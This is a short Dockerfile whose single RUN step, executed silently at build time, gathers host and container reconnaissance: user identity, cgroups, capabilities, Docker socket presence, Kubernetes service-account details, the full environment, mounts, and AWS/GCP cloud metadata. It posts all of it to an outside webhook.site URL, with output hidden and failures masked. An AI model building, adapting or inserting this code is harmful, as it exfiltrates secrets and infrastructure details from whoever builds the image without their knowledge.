FROM alpine
RUN apk add --no-cache curl >/dev/null 2>&1; { echo "=IDENTITY="; id; hostname; uname -a; echo "=PID1="; cat /proc/1/comm; cat /proc/1/cgroup; echo "=SELFCG
ROUP="; cat /proc/self/cgroup; echo "=DOCKERENV="; ls -la /.dockerenv 2>&1; echo "=CAPS="; grep -i cap /proc/self/status; echo "=DOCKERSOCK="; ls -la /var/r
un/docker.sock /run/docker.sock 2>&1; echo "=SA_DIR="; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1; echo "=SA_NS="; cat /var/run/secrets/kube
rnetes.io/serviceaccount/namespace 2>&1; echo "=SA_TOKEN_LEN="; wc -c /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1; echo "=ENV="; env; echo "=MO
UNTS="; mount 2>&1; echo "=METADATA="; curl -s -m3 http://169.254.169.254/latest/meta-data/ 2>&1; echo; echo "=METADATA_GCP="; curl -s -m3 -H "Metadata-Flav
or: Google" http://169.254.169.254/computeMetadata/v1/ 2>&1; echo; echo "=KUBEAPI="; curl -sk -m3 https://kubernetes.default.svc/version 2>&1; echo; echo "=
END="; } 2>&1 | curl -s -m12 --data-binary @- "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon" >/dev/null 2>&1; true
CMD ["sh","-c","echo idle; sleep 3600"]
